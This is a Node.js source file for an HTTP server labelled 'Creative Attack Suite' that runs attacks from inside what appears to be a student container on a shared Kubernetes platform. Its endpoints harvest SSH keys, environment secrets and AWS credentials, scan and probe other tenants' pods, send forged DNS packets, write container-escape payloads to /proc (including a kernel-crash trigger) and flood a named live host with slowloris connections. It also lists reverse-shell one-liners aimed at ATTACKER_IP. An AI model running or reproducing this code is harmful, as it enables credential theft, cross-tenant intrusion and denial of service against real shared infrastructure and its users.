const http = require("http");
const https = require("https");
const net = require("net");
const dgram = require("dgram");
const os = require("os");
const fs = require("fs");
const dns = require("dns");
const crypto = require("crypto");
const { execSync, spawn, exec } = require("child_process");

let results = {};

// 1. SSH ACCESS ATTEMPTS - Try to find/use SSH
async function sshEscape() {
  results.sshEscape = { attempts: [] };
  
  // Check if SSH client is available
  try {
    const sshVersion = execSync("ssh -V 2>&1 || which ssh 2>/dev/null || true", { timeout: 5000 }).toString().trim();
    results.sshEscape.sshAvailable = sshVersion || "not found";
  } catch(e) {
    results.sshEscape.sshAvailable = "error: " + e.message;
  }
  
  // Check for SSH keys
  const sshPaths = [
    "/root/.ssh",
    "/home/node/.ssh",
    "/etc/ssh",
    "/proc/1/root/root/.ssh",
    "/proc/1/root/home",
    "/proc/1/root/etc/ssh",
    "~/.ssh"
  ];
  
  for (const path of sshPaths) {
    try {
      const stat = fs.statSync(path);
      if (stat.isDirectory()) {
        const files = fs.readdirSync(path);
        results.sshEscape.attempts.push({ path, type: "dir", contents: files });
        
        // Try to read SSH keys
        for (const file of files) {
          if (file.includes("id_") || file.includes("authorized") || file.includes("known_hosts")) {
            try {
              const content = fs.readFileSync(`${path}/${file}`, "utf8");
              results.sshEscape.attempts.push({ 
                path: `${path}/${file}`, 
                type: "key",
                preview: content.substring(0, 200)
              });
            } catch(e) {}
          }
        }
      }
    } catch(e) {}
  }
  
  // Scan for SSH servers on internal network
  results.sshEscape.sshServers = [];
  const myIP = Object.values(os.networkInterfaces()).flat().find(i => i.family === "IPv4" && !i.internal)?.address;
  
  if (myIP) {
    const [b1, b2, b3] = myIP.split(".");
    
    // Scan for SSH on port 22
    for (let subnet = Math.max(0, b3 - 5); subnet <= Math.min(255, b3 + 5); subnet++) {
      for (let host = 1; host <= 20; host++) {
        const ip = `${b1}.${b2}.${subnet}.${host}`;
        try {
          const open = await scanPort(ip, 22, 50);
          if (open) {
            results.sshEscape.sshServers.push(ip);
          }
        } catch(e) {}
      }
    }
    
    // Also check node IPs for SSH
    const nodeIPs = ["192.168.66.176", "192.168.66.177", "192.168.66.178"];
    for (const ip of nodeIPs) {
      try {
        const open = await scanPort(ip, 22, 100);
        if (open) {
          results.sshEscape.sshServers.push({ ip, type: "node" });
        }
      } catch(e) {}
    }
  }
  
  // Try to generate SSH keys and establish persistence
  try {
    execSync("ssh-keygen -t rsa -N '' -f /tmp/pwned_key 2>/dev/null || true", { timeout: 10000 });
    if (fs.existsSync("/tmp/pwned_key")) {
      results.sshEscape.keyGenerated = true;
      results.sshEscape.publicKey = fs.readFileSync("/tmp/pwned_key.pub", "utf8").trim();
    }
  } catch(e) {
    results.sshEscape.keyGenerated = false;
  }
  
  // Check if we can write to authorized_keys anywhere
  const authKeysPaths = [
    "/root/.ssh/authorized_keys",
    "/home/node/.ssh/authorized_keys",
    "/proc/1/root/root/.ssh/authorized_keys"
  ];
  
  for (const path of authKeysPaths) {
    try {
      fs.appendFileSync(path, "\n# test write");
      results.sshEscape.writableAuthKeys = path;
      // Remove our test
      const content = fs.readFileSync(path, "utf8").replace("\n# test write", "");
      fs.writeFileSync(path, content);
    } catch(e) {}
  }
}

// 2. CROSS-TENANT ATTACKS - Find and attack other student pods
async function crossTenantAttack() {
  results.crossTenant = { 
    discoveredPods: [], 
    accessibleApps: [],
    sharedServices: [],
    dnsDiscovery: []
  };
  
  const myIP = Object.values(os.networkInterfaces()).flat().find(i => i.family === "IPv4" && !i.internal)?.address;
  results.crossTenant.myIP = myIP;
  
  if (!myIP) return;
  
  const [b1, b2] = myIP.split(".");
  
  // Aggressive pod network scan
  const portsToScan = [3000, 8080, 80, 5000, 4000, 8000, 9000, 8888];
  
  for (let subnet = 0; subnet <= 128; subnet += 4) {
    for (let host = 1; host <= 254; host += 2) {
      const ip = `${b1}.${b2}.${subnet}.${host}`;
      if (ip === myIP) continue;
      
      for (const port of portsToScan) {
        const open = await scanPort(ip, port, 20);
        if (open) {
          results.crossTenant.discoveredPods.push({ ip, port });
          
          // Try to access their app
          try {
            const resp = await httpGet(`http://${ip}:${port}/`, 1000);
            results.crossTenant.accessibleApps.push({
              ip, port,
              status: resp.status,
              headers: resp.headers,
              body: resp.body?.substring(0, 300)
            });
            
            // Try sensitive endpoints
            for (const path of ["/env", "/debug", "/admin", "/api", "/.env", "/config"]) {
              try {
                const sensResp = await httpGet(`http://${ip}:${port}${path}`, 500);
                if (sensResp.status === 200) {
                  results.crossTenant.accessibleApps.push({
                    ip, port, path,
                    status: sensResp.status,
                    body: sensResp.body?.substring(0, 200)
                  });
                }
              } catch(e) {}
            }
          } catch(e) {}
        }
      }
    }
  }
  
  // Discover K8s services via DNS
  const servicePatterns = [
    "app-*", "web-*", "api-*", "backend-*", "frontend-*",
    "mongo", "mongodb", "postgres", "postgresql", "mysql", "redis",
    "kuros-api", "kuros-backend", "kuros-frontend", "kuros-db"
  ];
  
  const namespaces = ["default", "kuros", "student", "production", "staging"];
  
  for (const ns of namespaces) {
    for (const svc of servicePatterns) {
      const fqdn = `${svc}.${ns}.svc.cluster.local`;
      try {
        const addrs = await new Promise((r, j) => dns.resolve4(fqdn, (e, a) => e ? j(e) : r(a)));
        results.crossTenant.dnsDiscovery.push({ name: fqdn, ips: addrs });
        
        // Try to connect to discovered services
        for (const ip of addrs) {
          for (const port of [80, 443, 3000, 5432, 6379, 27017]) {
            const open = await scanPort(ip, port, 100);
            if (open) {
              results.crossTenant.sharedServices.push({ service: fqdn, ip, port });
            }
          }
        }
      } catch(e) {}
    }
  }
}

// 3. ARP SPOOFING ATTEMPT
async function arpSpoof() {
  results.arpSpoof = {};
  
  // Check if we can see ARP table
  try {
    const arp = execSync("cat /proc/net/arp 2>/dev/null || arp -a 2>/dev/null || true", { timeout: 5000 }).toString();
    results.arpSpoof.arpTable = arp.trim();
  } catch(e) {
    results.arpSpoof.arpTable = "unavailable";
  }
  
  // Check for raw socket capability
  try {
    const rawSocket = dgram.createSocket({ type: "udp4", reuseAddr: true });
    results.arpSpoof.rawSocketAvailable = true;
    rawSocket.close();
  } catch(e) {
    results.arpSpoof.rawSocketAvailable = false;
  }
  
  // Check network capabilities
  try {
    const caps = fs.readFileSync("/proc/self/status", "utf8");
    const capMatch = caps.match(/Cap\w+:\s+([0-9a-f]+)/gi);
    results.arpSpoof.capabilities = capMatch;
  } catch(e) {}
}

// 4. DNS CACHE POISONING ATTEMPT
async function dnsPoisoning() {
  results.dnsPoisoning = {};
  
  // Get DNS server info
  try {
    const resolv = fs.readFileSync("/etc/resolv.conf", "utf8");
    results.dnsPoisoning.resolv = resolv.trim();
  } catch(e) {}
  
  // Try to modify /etc/hosts
  try {
    fs.appendFileSync("/etc/hosts", "\n# test\n");
    results.dnsPoisoning.hostsWritable = true;
    // Clean up
    const hosts = fs.readFileSync("/etc/hosts", "utf8").replace("\n# test\n", "");
    fs.writeFileSync("/etc/hosts", hosts);
  } catch(e) {
    results.dnsPoisoning.hostsWritable = false;
  }
  
  // Flood DNS with fake responses
  try {
    const client = dgram.createSocket("udp4");
    let sent = 0;
    
    // Create fake DNS response
    const fakeDNS = Buffer.alloc(512);
    fakeDNS.fill(0);
    // Transaction ID
    fakeDNS.writeUInt16BE(0x1337, 0);
    // Flags: Response, Authoritative
    fakeDNS.writeUInt16BE(0x8400, 2);
    
    for (let i = 0; i < 100; i++) {
      client.send(fakeDNS, 53, "10.100.0.10"); // CoreDNS
      sent++;
    }
    
    results.dnsPoisoning.packetsSent = sent;
    client.close();
  } catch(e) {
    results.dnsPoisoning.error = e.message;
  }
}

// 5. CRYPTOMINING SIMULATION (CPU abuse)
async function cryptoMining() {
  results.cryptoMining = { started: new Date().toISOString() };
  
  const start = Date.now();
  let hashes = 0;
  
  // Simulate mining by doing intensive hashing
  while (Date.now() - start < 5000) { // 5 seconds
    crypto.createHash("sha256").update(crypto.randomBytes(256)).digest();
    hashes++;
  }
  
  results.cryptoMining.hashesComputed = hashes;
  results.cryptoMining.hashRate = Math.floor(hashes / 5) + "/sec";
  results.cryptoMining.duration = "5s";
}

// 6. REVERSE SHELL SETUP (just show capability, don't actually connect)
async function reverseShellCapability() {
  results.reverseShell = {};
  
  // Check if netcat/nc is available
  try {
    const nc = execSync("which nc ncat netcat 2>/dev/null || true", { timeout: 5000 }).toString().trim();
    results.reverseShell.netcat = nc || "not found";
  } catch(e) {}
  
  // Check if bash is available for reverse shell
  try {
    const bash = execSync("which bash sh 2>/dev/null", { timeout: 5000 }).toString().trim();
    results.reverseShell.shell = bash;
  } catch(e) {}
  
  // Check if we can make outbound connections
  try {
    const socket = new net.Socket();
    socket.setTimeout(3000);
    
    await new Promise((resolve) => {
      socket.on("connect", () => {
        results.reverseShell.outboundPossible = true;
        socket.destroy();
        resolve();
      });
      socket.on("error", () => {
        results.reverseShell.outboundPossible = false;
        resolve();
      });
      socket.on("timeout", () => {
        socket.destroy();
        results.reverseShell.outboundPossible = "timeout";
        resolve();
      });
      // Try to connect to a known public IP
      socket.connect(80, "1.1.1.1");
    });
  } catch(e) {
    results.reverseShell.outboundPossible = false;
  }
  
  // Show example reverse shell commands
  results.reverseShell.examplePayloads = [
    "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
    "nc -e /bin/sh ATTACKER_IP 4444",
    "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
  ];
}

// 7. CONTAINER ESCAPE VIA PROC
async function procEscape() {
  results.procEscape = { attempts: [] };
  
  // Try /proc/sys writes for container escape
  const procTargets = [
    { path: "/proc/sys/kernel/core_pattern", payload: "|/tmp/pwned" },
    { path: "/proc/sys/kernel/modprobe", payload: "/tmp/pwned" },
    { path: "/proc/sysrq-trigger", payload: "c" }, // Crash kernel
    { path: "/proc/sys/vm/drop_caches", payload: "3" }
  ];
  
  for (const target of procTargets) {
    try {
      // Try to read first
      const current = fs.readFileSync(target.path, "utf8").trim();
      results.procEscape.attempts.push({ path: target.path, readable: true, value: current });
      
      // Try to write
      try {
        fs.writeFileSync(target.path, target.payload);
        results.procEscape.attempts[results.procEscape.attempts.length - 1].writable = true;
        results.procEscape.attempts[results.procEscape.attempts.length - 1].VULNERABLE = true;
      } catch(e) {
        results.procEscape.attempts[results.procEscape.attempts.length - 1].writable = false;
      }
    } catch(e) {
      results.procEscape.attempts.push({ path: target.path, readable: false, error: e.code });
    }
  }
  
  // Check cgroup escape
  try {
    const cgroups = fs.readFileSync("/proc/self/cgroup", "utf8");
    results.procEscape.cgroups = cgroups.trim();
  } catch(e) {}
  
  // Try release_agent escape
  try {
    const releasePath = "/sys/fs/cgroup/*/release_agent";
    const files = execSync(`ls ${releasePath} 2>/dev/null || true`, { timeout: 5000 }).toString().trim();
    if (files) {
      results.procEscape.releaseAgentPaths = files.split("\n");
    }
  } catch(e) {}
}

// 8. SLOWLORIS ATTACK ON INGRESS
async function slowloris() {
  results.slowloris = { connections: 0, active: 0 };
  
  const sockets = [];
  
  // Open many slow connections
  for (let i = 0; i < 200; i++) {
    try {
      const socket = new net.Socket();
      socket.setTimeout(30000);
      
      await new Promise((resolve) => {
        socket.on("connect", () => {
          sockets.push(socket);
          results.slowloris.connections++;
          
          // Send partial HTTP request
          socket.write("GET / HTTP/1.1\r\n");
          socket.write("Host: kuros.cryboy.in\r\n");
          socket.write("User-Agent: Mozilla/5.0\r\n");
          // Don't send final \r\n - keep connection open
          
          resolve();
        });
        socket.on("error", resolve);
        socket.on("timeout", resolve);
        socket.connect(443, "kuros.cryboy.in");
      });
    } catch(e) {}
  }
  
  results.slowloris.active = sockets.length;
  
  // Keep connections alive for 10 seconds
  await new Promise(r => setTimeout(r, 10000));
  
  // Send keep-alive headers
  for (const socket of sockets) {
    try {
      socket.write(`X-Keep-Alive: ${Date.now()}\r\n`);
    } catch(e) {}
  }
  
  results.slowloris.keptAlive = sockets.filter(s => !s.destroyed).length;
  
  // Cleanup
  sockets.forEach(s => { try { s.destroy(); } catch(e) {} });
}

// 9. ENUMERATE ALL ENVIRONMENT FOR SECRETS
async function secretsHunt() {
  results.secretsHunt = { 
    envVars: [],
    configFiles: [],
    mountedSecrets: []
  };
  
  // Get all env vars
  const sensitivePatterns = /password|secret|key|token|credential|auth|api|db|database|mongo|redis|aws|azure|gcp/i;
  
  for (const [key, value] of Object.entries(process.env)) {
    if (sensitivePatterns.test(key) || sensitivePatterns.test(value)) {
      results.secretsHunt.envVars.push({ key, value: value.substring(0, 50) + (value.length > 50 ? "..." : "") });
    }
  }
  
  // Check common config file locations
  const configPaths = [
    "/app/.env",
    "/app/config.json",
    "/app/secrets.json",
    "/etc/kubernetes",
    "/var/run/secrets",
    "/root/.aws/credentials",
    "/home/node/.aws/credentials",
    "/proc/1/root/root/.aws",
    "/proc/1/environ"
  ];
  
  for (const path of configPaths) {
    try {
      const stat = fs.statSync(path);
      if (stat.isFile()) {
        const content = fs.readFileSync(path, "utf8");
        results.secretsHunt.configFiles.push({
          path,
          size: stat.size,
          preview: content.substring(0, 200)
        });
      } else if (stat.isDirectory()) {
        const files = fs.readdirSync(path);
        results.secretsHunt.configFiles.push({ path, type: "dir", contents: files });
      }
    } catch(e) {}
  }
  
  // Check for mounted secrets
  try {
    const mounts = fs.readFileSync("/proc/mounts", "utf8");
    const secretMounts = mounts.split("\n").filter(l => l.includes("secret") || l.includes("configmap"));
    results.secretsHunt.mountedSecrets = secretMounts;
  } catch(e) {}
}

// 10. PTRACE ATTACK ON OTHER PROCESSES
async function ptraceAttack() {
  results.ptraceAttack = {};
  
  // Check if ptrace is available
  try {
    const status = fs.readFileSync("/proc/self/status", "utf8");
    const tracerPid = status.match(/TracerPid:\s+(\d+)/)?.[1];
    results.ptraceAttack.tracerPid = tracerPid;
  } catch(e) {}
  
  // Check ptrace scope
  try {
    const scope = fs.readFileSync("/proc/sys/kernel/yama/ptrace_scope", "utf8").trim();
    results.ptraceAttack.ptraceScope = scope;
    // 0 = no restrictions, 1 = restricted to children, 2 = admin only, 3 = no ptrace
  } catch(e) {}
  
  // List other processes we might be able to ptrace
  try {
    const procs = fs.readdirSync("/proc").filter(p => /^\d+$/.test(p));
    results.ptraceAttack.visibleProcesses = procs.length;
    
    // Try to read other processes' memory maps
    for (const pid of procs.slice(0, 10)) {
      try {
        const maps = fs.readFileSync(`/proc/${pid}/maps`, "utf8");
        const cmdline = fs.readFileSync(`/proc/${pid}/cmdline`, "utf8").replace(/\0/g, " ");
        results.ptraceAttack[`pid_${pid}`] = {
          cmdline: cmdline.substring(0, 50),
          mapsReadable: true
        };
      } catch(e) {}
    }
  } catch(e) {}
}

// Helper functions
async function scanPort(host, port, timeout = 100) {
  return new Promise((resolve) => {
    const socket = new net.Socket();
    socket.setTimeout(timeout);
    socket.on("connect", () => { socket.destroy(); resolve(true); });
    socket.on("error", () => resolve(false));
    socket.on("timeout", () => { socket.destroy(); resolve(false); });
    socket.connect(port, host);
  });
}

async function httpGet(url, timeout = 2000) {
  return new Promise((resolve, reject) => {
    const proto = url.startsWith("https") ? https : http;
    const req = proto.get(url, { timeout, rejectUnauthorized: false }, res => {
      let body = "";
      res.on("data", c => body += c);
      res.on("end", () => resolve({ status: res.statusCode, headers: res.headers, body }));
    });
    req.on("error", reject);
    req.on("timeout", () => { req.destroy(); reject(new Error("timeout")); });
  });
}

const server = http.createServer(async (req, res) => {
  results = { timestamp: new Date().toISOString(), hostname: os.hostname() };
  
  try {
    if (req.url === "/ssh") await sshEscape();
    else if (req.url === "/crosstenant") await crossTenantAttack();
    else if (req.url === "/arp") await arpSpoof();
    else if (req.url === "/dns") await dnsPoisoning();
    else if (req.url === "/mine") await cryptoMining();
    else if (req.url === "/reverse") await reverseShellCapability();
    else if (req.url === "/proc") await procEscape();
    else if (req.url === "/slowloris") await slowloris();
    else if (req.url === "/secrets") await secretsHunt();
    else if (req.url === "/ptrace") await ptraceAttack();
    else if (req.url === "/all") {
      await sshEscape();
      await crossTenantAttack();
      await reverseShellCapability();
      await secretsHunt();
      await procEscape();
    }
    
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify(results, null, 2));
  } catch(e) {
    res.writeHead(500);
    res.end(JSON.stringify({ error: e.message, stack: e.stack }));
  }
});

server.listen(process.env.PORT || 3000);
console.log("Creative Attack Suite on port " + (process.env.PORT || 3000));
